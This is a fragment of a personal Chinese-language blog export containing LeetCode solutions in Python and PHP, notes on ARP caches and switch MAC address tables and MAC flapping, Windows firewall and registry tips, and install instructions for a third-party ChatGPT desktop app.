never</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">getCnt</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">31</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (((x &gt;&gt; i) &amp; <span class="number">1</span>) == <span class="number">1</span>) ans++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="1672-最富有客户的资产总量"><a href="#1672-最富有客户的资产总量" class="headerlink" title="1672.最富有客户的资产总量"></a>1672.最富有客户的资产总量</h3><p>给你一个 m x n 的整数网格 accounts ，其中 accounts[i] [j] 是第 i 位客户在第 j 家银行托管的资产数量。返回最富有客户所拥有的 资产总量 。客户的 资产总量 就是他们在各家银行托管的资产数量之和。最富有客户就是 资产总量 最大的客户。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">maximumWealth</span>(<span class="params">self, accounts</span>):</span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(accounts)):</span><br><span class="line">            <span class="built_in">max</span> = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(accounts[i])):</span><br><span class="line">                <span class="built_in">max</span> += accounts[i][j]</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">max</span> &gt; result:</span><br><span class="line">                result = <span class="built_in">max</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
<p>遍历</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def maximumWealth(self, accounts: List[List[int]]) -&gt; int:</span><br><span class="line">        return max(map(sum, accounts))</span><br></pre></td></tr></table></figure>
<h3 id="412-Fizz-Buzz"><a href="#412-Fizz-Buzz" class="headerlink" title="412.Fizz Buzz"></a>412.Fizz Buzz</h3><p>给你一个整数 n ，找出从 1 到 n 各个整数的 Fizz Buzz 表示，并用字符串数组 answer（下标从 1 开始）返回结果，其中：</p>
<p>answer[i] == “FizzBuzz” 如果 i 同时是 3 和 5 的倍数。<br>answer[i] == “Fizz” 如果 i 是 3 的倍数。<br>answer[i] == “Buzz” 如果 i 是 5 的倍数。<br>answer[i] == i （以字符串形式）如果上述条件全不满足。</p>
<p>笨比算法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fizzBuzz</span>(<span class="params">self, n</span>):</span><br><span class="line">        answer = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">1</span>,n+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> i % <span class="number">3</span> == <span class="number">0</span> <span class="keyword">and</span> i % <span class="number">5</span> == <span class="number">0</span>:</span><br><span class="line">                answer.append(<span class="string">&quot;FizzBuzz&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> i % <span class="number">3</span> == <span class="number">0</span> <span class="keyword">and</span> i % <span class="number">5</span> != <span class="number">0</span>:</span><br><span class="line">                answer.append(<span class="string">&quot;Fizz&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> i % <span class="number">3</span> != <span class="number">0</span> <span class="keyword">and</span> i % <span class="number">5</span> == <span class="number">0</span>:</span><br><span class="line">                 answer.append(<span class="string">&quot;Buzz&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:     </span><br><span class="line">                answer.append(<span class="built_in">str</span>(i))</span><br><span class="line">        <span class="keyword">return</span> answer</span><br></pre></td></tr></table></figure>
<p>模拟+字符串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fizzBuzz</span>(<span class="params">self, n</span>):</span><br><span class="line">        answer = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">1</span>,n+<span class="number">1</span>):</span><br><span class="line">            s = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">if</span> i % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">                s += <span class="string">&quot;Fizz&quot;</span></span><br><span class="line">            <span class="keyword">if</span> i % <span class="number">5</span> == <span class="number">0</span>:</span><br><span class="line">                s += <span class="string">&quot;Buzz&quot;</span></span><br><span class="line">            <span class="keyword">if</span> s == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                s = <span class="built_in">str</span>(i)</span><br><span class="line">            answer.append(s)</span><br><span class="line">        <span class="keyword">return</span> answer</span><br></pre></td></tr></table></figure>
<h3 id="876-链表的中间结点"><a href="#876-链表的中间结点" class="headerlink" title="876.链表的中间结点"></a>876.链表的中间结点</h3><p>给你单链表的头结点 <code>head</code> ，请你找出并返回链表的中间结点。如果有两个中间结点，则返回第二个中间结点。</p>
<p>数组</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">middleNode</span>(<span class="params">self, head</span>):</span><br><span class="line">        a = [head]</span><br><span class="line">        <span class="keyword">while</span> a[-<span class="number">1</span>].<span class="built_in">next</span> != <span class="literal">None</span>:</span><br><span class="line">            a.append(a[-<span class="number">1</span>].<span class="built_in">next</span>)</span><br><span class="line">        <span class="keyword">return</span> a[<span class="built_in">len</span>(a)/<span class="number">2</span>]</span><br></pre></td></tr></table></figure>
<p>单指针法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">middleNode</span>(<span class="params">self, head</span>):</span><br><span class="line">        n,a = <span class="number">0</span>,head</span><br><span class="line">        <span class="keyword">while</span> a:</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            a = a.<span class="built_in">next</span></span><br><span class="line">        m,a = <span class="number">0</span>,head</span><br><span class="line">        <span class="keyword">while</span> m &lt; n/<span class="number">2</span>:</span><br><span class="line">            m += <span class="number">1</span></span><br><span class="line">            a = a.<span class="built_in">next</span></span><br><span class="line">        <span class="keyword">return</span> a</span><br></pre></td></tr></table></figure>
<p>快慢指针</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">middleNode</span>(<span class="params">self, head</span>):</span><br><span class="line">        low,fast = head,head</span><br><span class="line">        <span class="keyword">while</span> fast <span class="keyword">and</span> fast.<span class="built_in">next</span>:</span><br><span class="line">            low = low.<span class="built_in">next</span></span><br><span class="line">            fast = fast.<span class="built_in">next</span>.<span class="built_in">next</span></span><br><span class="line">        <span class="keyword">return</span> low</span><br></pre></td></tr></table></figure>
<h3 id="383-赎金信"><a href="#383-赎金信" class="headerlink" title="383.赎金信"></a>383.赎金信</h3><p>给你两个字符串：ransomNote 和 magazine ，判断 ransomNote 能不能由 magazine 里面的字符构成。如果可以，返回 true ；否则返回 false 。magazine 中的每个字符只能在 ransomNote 中使用一次。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">canConstruct</span>(<span class="params">self, ransomNote, magazine</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type ransomNote: str</span></span><br><span class="line"><span class="string">        :type magazine: str</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span> </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(ransomNote) &gt; <span class="built_in">len</span>(magazine):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">not</span> collections.Counter(ransomNote) - collections.Counter(magazine)</span><br></pre></td></tr></table></figure>
<p>PHP中使用hash表</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $ransomNote</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $magazine</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Boolean</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">canConstruct</span>(<span class="params"><span class="variable">$ransomNote</span>, <span class="variable">$magazine</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$magazine</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$hashtable</span>[<span class="variable">$magazine</span>[<span class="variable">$i</span>]] +=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="variable">$hashtable</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$ransomNote</span>);<span class="variable">$j</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$hashtable</span>[<span class="variable">$ransomNote</span>[<span class="variable">$j</span>]]) == <span class="literal">NULL</span> || <span class="variable">$hashtable</span>[<span class="variable">$ransomNote</span>[<span class="variable">$j</span>]] ==<span class="number">0</span> )  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="variable">$hashtable</span>[<span class="variable">$ransomNote</span>[<span class="variable">$j</span>]] -=<span class="number">1</span>;</span><br><span class="line">        &#125;      </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2-两数相加"><a href="#2-两数相加" class="headerlink" title="2.两数相加"></a>2.两数相加</h3><p>给你两个 非空 的链表，表示两个非负的整数。它们每位数字都是按照 逆序 的方式存储的，并且每个节点只能存储 一位 数字。请你将两个数相加，并以相同形式返回一个表示和的链表。你可以假设除了数字 0 之外，这两个数都不会以 0 开头。</p>
<p><img src="/2023/03/28/leetcode/image-20230329103833666.png" alt="image-20230329103833666" style="zoom:50%;"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.next = None</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">addTwoNumbers</span>(<span class="params">self,l1,l2</span>):</span><br><span class="line">        n=l1.val+l2.val</span><br><span class="line">        l3=ListNode(n % <span class="number">10</span>)</span><br><span class="line">        l3.<span class="built_in">next</span>=ListNode(n//<span class="number">10</span>)</span><br><span class="line">        p1=l1.<span class="built_in">next</span></span><br><span class="line">        p2=l2.<span class="built_in">next</span></span><br><span class="line">        p3=l3</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> p1 <span class="keyword">and</span> p2:</span><br><span class="line">                <span class="built_in">sum</span>=p1.val+p2.val+p3.<span class="built_in">next</span>.val</span><br><span class="line">                p3.<span class="built_in">next</span>.val=<span class="built_in">sum</span>%<span class="number">10</span></span><br><span class="line">                p3.<span class="built_in">next</span>.<span class="built_in">next</span>=ListNode(<span class="built_in">sum</span>//<span class="number">10</span>)</span><br><span class="line">                p1=p1.<span class="built_in">next</span></span><br><span class="line">                p2=p2.<span class="built_in">next</span></span><br><span class="line">                p3=p3.<span class="built_in">next</span></span><br><span class="line">            <span class="keyword">elif</span> p1 <span class="keyword">and</span> <span class="keyword">not</span> p2:</span><br><span class="line">                <span class="built_in">sum</span>=p1.val+p3.<span class="built_in">next</span>.val</span><br><span class="line">                p3.<span class="built_in">next</span>.val=<span class="built_in">sum</span>%<span class="number">10</span></span><br><span class="line">                p3.<span class="built_in">next</span>.<span class="built_in">next</span>=ListNode(<span class="built_in">sum</span>//<span class="number">10</span>)</span><br><span class="line">                p1=p1.<span class="built_in">next</span></span><br><span class="line">                p3=p3.<span class="built_in">next</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="keyword">not</span> p1 <span class="keyword">and</span> p2:</span><br><span class="line">                <span class="built_in">sum</span>=p2.val+p3.<span class="built_in">next</span>.val</span><br><span class="line">                p3.<span class="built_in">next</span>.val=<span class="built_in">sum</span>%<span class="number">10</span></span><br><span class="line">                p3.<span class="built_in">next</span>.<span class="built_in">next</span>=ListNode(<span class="built_in">sum</span>//<span class="number">10</span>)</span><br><span class="line">                p2=p2.<span class="built_in">next</span></span><br><span class="line">                p3=p3.<span class="built_in">next</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> p3.<span class="built_in">next</span>.val==<span class="number">0</span>:</span><br><span class="line">                    p3.<span class="built_in">next</span>=<span class="literal">None</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> l3</span><br></pre></td></tr></table></figure>
<h3 id="287-寻找重复数"><a href="#287-寻找重复数" class="headerlink" title="287.寻找重复数"></a>287.寻找重复数</h3><p>给定一个包含 n + 1 个整数的数组 nums ，其数字都在 [1, n] 范围内（包括 1 和 n），可知至少存在一个重复的整数。假设 nums 只有 一个重复的整数 ，返回 这个重复的数 。你设计的解决方案必须 不修改 数组 nums 且只用常量级 O(1) 的额外空间。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line">输入：nums = <span class="string">[1,3,4,2,2]</span></span><br><span class="line">输出：<span class="number">2</span></span><br></pre></td></tr></table></figure>
<p><strong>示例 2：</strong></p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line">输入：nums = <span class="string">[3,1,3,4,2]</span></span><br><span class="line">输出：<span class="number">3</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>mac</title>
    <url>/2023/03/27/mac/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>mac的相关学习以及修改</p>
<span id="more"></span>
<h2 id="修改mac"><a href="#修改mac" class="headerlink" title="修改mac"></a>修改mac</h2><p><strong>首先要声明的是“MAC地址的更改”不是更改网卡中的MAC，而是更改ARP缓存表中的MAC地址。</strong></p>
<p>管理员权限下运行<code>arp -s &lt;ip地址&gt; &lt;mac地址&gt;</code><br><img src="/2023/03/27/mac/image-20230327112421139.png" alt="image-20230327112421139"></p>
<p><code>arp -a</code>查看ARP缓存表，看到对应mac地址修改成功<br><img src="/2023/03/27/mac/image-20230327112606864.png" alt="image-20230327112606864"></p>
<p>或</p>
<p>win11中，打开设置-&gt;网络和Internet-&gt;高级网络设置-&gt;更多网络适配器选项-&gt;点击目标网络-&gt;属性-&gt;配置-&gt;高级-&gt;Network Address-&gt;在值中写入mac地址</p>
<p><img src="/2023/03/27/mac/image-20230327113015663-16799629782758.png" alt="image-20230327113015663"></p>
<p><img src="/2023/03/27/mac/image-20230327113115494-16799629760257.png" alt="image-20230327113115494"></p>
<h2 id="交换机系统中查看MAC地址表"><a href="#交换机系统中查看MAC地址表" class="headerlink" title="交换机系统中查看MAC地址表"></a>交换机系统中查看MAC地址表</h2><p><code>display mac-address</code>，如<br><img src="/2023/03/27/mac/image-20230327114358665-16799629733346.png" alt="image-20230327114358665"></p>
<h2 id="动态mac表项"><a href="#动态mac表项" class="headerlink" title="动态mac表项"></a>动态mac表项</h2><p>初始时，交换机的MAC地址表是空的，随着网络中的各台设备陆续开始发送数据（一般通过泛洪实现），交换机也在各个接口上学习MAC地址，并持续维护自己的MAC地址表。<br>当网络稳定后（数据转发不再依靠泛洪，而是通过Mac地址表寻址实现），并且这些MAC地址表项都是动态的(类型为dynamic )。</p>
<h3 id="动态mac表项的老化机制"><a href="#动态mac表项的老化机制" class="headerlink" title="动态mac表项的老化机制"></a>动态mac表项的老化机制</h3><p>一个动态的MAC地址表项被加载到交换机的MAC地址表后，其老化计时器也就随即启动，并开始倒计时，当该计时器计数到0时，这个MAC表项将被删除。</p>
<p>在交换机每收到一个数据帧时，MAC地址表中与该数据帧的源MAC地址对应的表项也会被刷新，该表项的老化计时器将被复位并重新开始倒计时。</p>
<p>交换机缺省的动态MAC地址表项老化时间为300s（HW），在系统视图下执行mac-address aging-time命令（HW）可修改动态MAC表项的老化时间。但是在实际的网络中不建议随意修改该老化时间</p>
<h3 id="动态MAC地址学习数量"><a href="#动态MAC地址学习数量" class="headerlink" title="动态MAC地址学习数量"></a>动态MAC地址学习数量</h3><p><code>mac-limit maximum max-num</code>（HW）:可限制该接口的MAC地址学习数量。<br><code>mac-limit action &#123; discard | forward&#125;</code>（HW）:可配置当MAC地址数量达到限制后，交换机对数据帧执行的操作：<br>（1）当指定的action为discard时，在MAC地址表项数量达到限制后，若该接口收到的数据帧的源MAC地址为新的MAC地址时，丢弃这些帧。此行为是缺省动作。<br>（2）当指定的action为forward时，在MAC地址表项数量达到限制后，若该接口收到的数据帧的源MAC地址为新的MAC地址时，转发这些帧，但是不记录MAC地址表项。<br><code>mac-limit alarm &#123; disable | enable&#125;</code>（HW）:可配置当MAC地址数量达到限制后是否进行告警：<br>（1）如果指定关键字是enable，则当MAC地址数量达到限制后进行告警，该行为是缺省动作。<br>（2）如果指定关键字是disable，则不告警。</p>
<h2 id="静态MAC表项"><a href="#静态MAC表项" class="headerlink" title="静态MAC表项"></a>静态MAC表项</h2><h3 id="MAC地址漂移"><a href="#MAC地址漂移" class="headerlink" title="MAC地址漂移"></a>MAC地址漂移</h3><p>一个MAC地址有两个出接口，并且后学习到的出接口覆盖原出接口的现象。这是官方定义，通俗的讲，MAC地址漂移指的是MAC地址表项的出接口发生了变更。</p>
<h4 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h4><ul>
<li>上网反应慢</li>
<li>上网无响应</li>
<li>视频加载卡住</li>
</ul>
<h4 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h4><p><img src="/2023/03/27/mac/image-20230327191651860-16799629692075.png" alt="image-20230327191651860"></p>
<p>如上图，正常情况下，PC的报文通过Port1进入Switch后，会从Port3转发出去，MAC地址表项学习到的出接口是Port1。但是当Switch、Switch1和Swtich2三台设备之间存在环路时，PC的报文通过Switch2-­­­-&gt;Switch1后，又会通过Port2进入Switch，导致MAC地址表项的出接口更新为Port2，从而就会产生MAC地址漂移告警。<strong>由此可见MAC地址发生漂移的根本原因就是组网中存在二层环路。</strong></p>
<h4 id="判断方法"><a href="#判断方法" class="headerlink" title="判断方法"></a>判断方法</h4><ol>
<li>在打开终端显示和MAC地址漂移告警开关情况下，在设备产生MAC地址漂移告警时，就会打印出如下告警信息。并且会间隔一段时间多次打印哟。</li>
</ol>
<p><img src="/2023/03/27/mac/v2-cccb051bdd1307621106ea0aeec784db_720w.webp" alt="img"></p>
<ol>
<li>在打开MAC地址漂移告警开关时，通过命令display trapbuffer查看告警的缓存信息，判断设备上是否存在MAC地址漂移。<br><img src="/2023/03/27/mac/v2-6e0589eebe5c73216faa2198c5ac01f5_720w.webp" alt="img"></li>
<li>在打开MAC地址漂移检测功能时，通过命令display mac-address flapping record查看最近一个月MAC地址漂移的信息。记录的信息包括：MAC地址漂移发生的开始时间和结束时间，发生MAC地址漂移的VLAN和MAC，漂移的端口和漂移的次数。<img src="/2023/03/27/mac/v2-a29a2a7bd392282ab463e6b96a9864f4_720w.webp" alt="img"></li>
<li>在没有开启MAC地址漂移检测功能时，只能用最原始的办法—-不停的查看MAC地址表项的出接口，来判断设备上是否存在MAC地址漂移了。如下图，多次查看MAC地址表项，出接口信息在两个端口之间跳变。这就可以认为发生了MAC地址漂移。</li>
</ol>
<h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h3><p>消除MAC地址漂移的办法有三种：</p>
<p>1.<strong>人工把发生漂移的接口shutdown</strong></p>
<p>优点：最简单可靠</p>
<p> 缺点：需要人工参与，整个接口的流量都会中断。</p>
<p>2.<strong>通过在接口上配置漂移检测动作为error-dwon，自动down掉漂移的端口</strong></p>
<p>优点：及时快捷，还可以通过配置自动恢复时间定时恢复端口。</p>
<p>缺点：整个接口的流量都会中断。</p>
<p>3.<strong>通过在接口上配置漂移检测动作为quit-vlan，使发生漂移的接口指定VLAN域内退出，从而消除MAC地址漂移，破除环路</strong></p>
<p>优点：只解决存在环路的VLAN域，不会使其他正常VLAN域的流量中断。</p>
<p>缺点：指定老化周期内，只能使一个接口从VLAN中退出。如果存在多个环路，破环会比较慢。</p>
<p>4.<strong>配置静态MAC表项。</strong></p>
<p>SW1的配置如下:[SWl]mac-address staric 5489-987e-10d0 Gigabiet 0/0/2 vlan 20，通过该命令可以配置一条静态Mac地址表项。</p>
<p>配置成功之后，可以通过命令查看Mac地址表项信息：<br><img src="/2023/03/27/mac/20200602214849471.png" alt="在这里插入图片描述"></p>
<p>静态的Mac表项是永远不会被老化的，</p>
<p>并且其优先级比动态表项更高，这意味着当SW1再从GE0/0/3接口收到以Server的MAC地址为源的数据帧时，SW1会将这些数据帧丢弃。因此，通过设置静态MAC表项，可以确保与交换机固定连接的可信任节点的安全通信。</p>
<h3 id="无太大影响的情况"><a href="#无太大影响的情况" class="headerlink" title="无太大影响的情况"></a>无太大影响的情况</h3><p>1、因为环路或VRRP切换，导致的MAC地址漂移告警。2、因为无线用户漫游，导致的MAC地址漂移告警。3、因为VRRP主备倒换，导致的MAC地址漂移告警。</p>
]]></content>
      <categories>
        <category>系统配置</category>
      </categories>
      <tags>
        <tag>链路层</tag>
        <tag>mac</tag>
      </tags>
  </entry>
  <entry>
    <title>windows操作系统</title>
    <url>/2023/03/26/windows%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>windows操作系统中遇到的错误</p>
<span id="more"></span>
<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="管理员权限"><a href="#管理员权限" class="headerlink" title="管理员权限"></a>管理员权限</h2><p><code>runas /noprofile /user:&lt;管理员账户&gt; cmd</code></p>
<p>win+r输入cmd后，ctrl+shift+enter进入管理员权限</p>
<h1 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h1><h2 id="远程计算机或设备将不接受连接"><a href="#远程计算机或设备将不接受连接" class="headerlink" title="远程计算机或设备将不接受连接"></a>远程计算机或设备将不接受连接</h2><p><img src="/2023/03/26/windows%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/../../../../../blog/source/_posts/docker/image-20230326112140890.png" alt="image-20230326112140890" style="zoom:67%;"></p>
<p>解决方法：关闭代理服务器<br><img src="/2023/03/26/windows%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/../../../../../blog/source/_posts/docker/image-20230326112457481.png" alt="image-20230326112457481" style="zoom:50%;"></p>
<h3 id="打开端口的方法"><a href="#打开端口的方法" class="headerlink" title="打开端口的方法"></a>打开端口的方法</h3><p>基于win11操作系统环境</p>
<ul>
<li>win+r输入control打开控制面板</li>
<li>在==控制面板\系统和安全\Windows Defender 防火墙==路径下选择高级设置</li>
<li>在入站规则中选择新建规则</li>
<li>在端口和协议中选择端口栏<br><img src="/2023/03/26/windows%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/../../../../../blog/source/_posts/docker/image-20230326112940480.png" alt="image-20230326112940480"></li>
<li><p>下一页选择规则类型和端口<img src="/2023/03/26/windows%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/../../../../../blog/source/_posts/docker/image-20230326113026259.png" alt="image-20230326113026259"></p>
</li>
<li><p>操作和配置文件根据需求</p>
</li>
<li>名称和描述方便记录用途和更改</li>
<li>入站规则有显示证明成功<br><img src="/2023/03/26/windows%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/../../../../../blog/source/_posts/docker/image-20230326113342278.png" alt="image-20230326113342278"></li>
</ul>
<h1 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h1><h2 id="需要与该网络的Internet服务商ISP签署协议才能获得访问Internet的权限"><a href="#需要与该网络的Internet服务商ISP签署协议才能获得访问Internet的权限" class="headerlink" title="需要与该网络的Internet服务商ISP签署协议才能获得访问Internet的权限"></a>需要与该网络的Internet服务商ISP签署协议才能获得访问Internet的权限</h2><p>原因解析：微软更新协议导致连接外网需要与服务商重新签订ISP。</p>
<p>（1）科学上网</p>
<p>（2）更改注册表</p>
<ul>
<li>win+r输入regedit打开注册表编辑器</li>
<li>找到HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NlaSvc\Parameters\Internet路径下的EnableActiveProbing，并将值改为0</li>
<li>重启</li>
</ul>
]]></content>
      <categories>
        <category>系统配置</category>
      </categories>
      <tags>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>openai</title>
    <url>/2023/03/23/openai/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>chatgpt为代表的相关ai的初步了解</p>
<span id="more"></span>
<p>注册方面见实用工具</p>
<h2 id="chatgpt的桌面程序应用"><a href="#chatgpt的桌面程序应用" class="headerlink" title="chatgpt的桌面程序应用"></a>chatgpt的桌面程序应用</h2><p>可以通过<a href="https://github.com/lencx/ChatGPT">GitHub - lencx/ChatGPT：🔮 ChatGPT 桌面应用程序（Mac、Windows 和 Linux）</a>进行下载</p>
<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><ul>
<li><p><a href="https://github.com/lencx/ChatGPT/releases/download/v0.12.0/ChatGPT_0.12.0_windows_x86_64.msi">ChatGPT_0.12.0_windows_x86_64.msi</a>：直接下载</p>
</li>
<li><p>Use <a href="https://winstall.app/apps/lencx.ChatGPT">winget</a>:</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment"># install the latest version</span></span><br><span class="line">winget install <span class="attribute">--id</span>=lencx.ChatGPT -e</span><br><span class="line"></span><br><span class="line"><span class="comment"># install the specified version</span></span><br><span class="line">winget install <span class="attribute">--id</span>=lencx.ChatGPT -e --version 0.10.0</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h3><ul>
<li><p><a href="https://github.com/lencx/ChatGPT/releases/download/v0.12.0/ChatGPT_0.12.0_macos_aarch64.dmg">ChatGPT_0.12.0_macos_aarch64.dmg</a>:直接下载</p>
</li>
<li><p><a href="https://github.com/lencx/ChatGPT/releases/download/v0.12.0/ChatGPT_0.12.0_macos_x86_64.dmg">ChatGPT_0.12.0_macos_x86_64.dmg</a>: 直接下载</p>
</li>
<li><p>Homebrew</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">brew tap lencx<span class="regexp">/chatgpt https:/</span><span class="regexp">/github.com/</span>lencx/ChatGPT.git</span><br><span class="line">brew install --cask chatgpt --no-quarantine</span><br></pre></td></tr></table></figure>
<figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line">repo = <span class="string">&quot;lencx/chatgpt&quot;</span></span><br><span class="line">tap repo, <span class="string">&quot;https://github.com/<span class="subst">#&#123;repo&#125;</span>.git&quot;</span></span><br><span class="line">cask <span class="string">&quot;chatgpt&quot;</span>, args: &#123; <span class="string">&quot;no-quarantine&quot;</span>: <span class="literal">true</span> &#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
